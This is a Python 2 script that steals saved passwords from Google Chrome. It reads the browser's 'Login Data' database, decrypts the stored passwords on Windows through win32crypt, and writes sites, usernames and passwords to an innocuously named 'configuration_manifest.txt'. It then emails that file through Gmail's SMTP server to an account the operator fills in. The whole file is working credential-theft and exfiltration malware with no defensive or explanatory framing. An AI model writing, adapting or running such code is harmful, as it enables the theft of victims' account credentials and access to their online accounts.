import os,sys
import sqlite3
try:
    import win32crypt
except:
    pass
import argparse
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
import sys

gmail_user ='youremail@gmail.com' # REPLACE with your credentials
gmail_pwd ='yourpassword'
subject='log'
text=''
attach = '{}\\configuration_manifest.txt'.format(os.getenv('USERPROFILE'))


def mail():
    f = open(attach, 'w')
    a = sys.stdout
    sys.stdout = f
    print main()
    f.close()
    sys.stdout = a
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = gmail_user
    msg['Subject'] = subject

    msg.attach(MIMEText(text))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition','attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)
    mailServer = smtplib.SMTP("smtp.gmail.com", 587)
    #mailServer.ehlo()
    print(mailServer.ehlo())
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(gmail_user, gmail_pwd)
    mailServer.sendmail(gmail_user,gmail_user, msg.as_string())
    mailServer.close()

    

def main():
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()
            
        if (os.name == "posix") and (sys.platform == "darwin"):
                print("Mac OSX not supported.")
                sys.exit(0)

        for information in value:

            
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
                if password:
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })

            

            elif os.name == 'posix':
                info_list.append({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': information[2]
                    })
        
        
        
        
    except sqlite3.OperationalError, e:
            e = str(e)
            if (e == 'database is locked'):
                print '[!] Make sure Google Chrome is not running in the background'
            elif (e == 'no such table: logins'):
                print '[!] Something wrong with the database name'
            elif (e == 'unable to open database file'):
                print '[!] Something wrong with the database path'
            else:
                print e
    
 

    return info_list

def getpath():
    if os.name == "nt":
            # This is the Windows Path
            PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
            if (os.path.isdir(PathName) == False):
                print '[!] Chrome Doesn\'t exists'
                sys.exit(0)
    elif ((os.name == "posix") and (sys.platform == "darwin")):
            # This is the OS X Path
            PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
            if (os.path.isdir(PathName) == False):
                print '[!] Chrome Doesn\'t exists'
                sys.exit(0)
    elif (os.name == "posix"):
            # This is the Linux Path
            PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
            if (os.path.isdir(PathName) == False):
                print '[!] Chrome Doesn\'t exists'
                sys.exit(0)
    
    return PathName            

    
if __name__ == '__main__':
    
    mail()
    
